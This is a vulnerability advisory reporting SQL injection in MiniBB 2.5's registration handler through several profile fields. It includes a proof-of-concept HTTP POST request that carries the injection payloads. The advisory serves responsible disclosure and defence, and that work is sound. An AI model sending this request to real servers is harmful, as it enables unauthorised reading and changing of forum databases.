@@ -1,0 +1,29 @@
+Vulnerability ID: HTB22671
+Reference: http://www.htbridge.ch/advisory/sql_injection_in_minibb.html
+Product: MiniBB
+Vendor: MiniBB.com ( http://www.minibb.com/ ) 
+Vulnerable Version: 2.5
+Vendor Notification: 21 October 2010 
+Vulnerability Type: SQL Injection
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: High 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" scripts to properly sanitize user-supplied input in "icq", "occupation", "from", "interest", "viewemail", "user_sorttopics" and "language" variables.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+
+The following PoC is available:
+
+
+POST /index.php?action=registernew HTTP/1.1
+Host: [host]
+Referer: http://[host]/index.php?action=registernew
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 225
+
+action=register&login=pentest&passwd=pentest&passwd2=pentest&email=pentest%40pentest.com&icq=1%5C%5C&occupation=2%5C%5C&from=3%5C%5C&interest=4%5C%5C&user_viewemail=5%5C%5C&user_sorttopics=6%5C%5C&language=7%5C%5C&login=Login
+
+
+
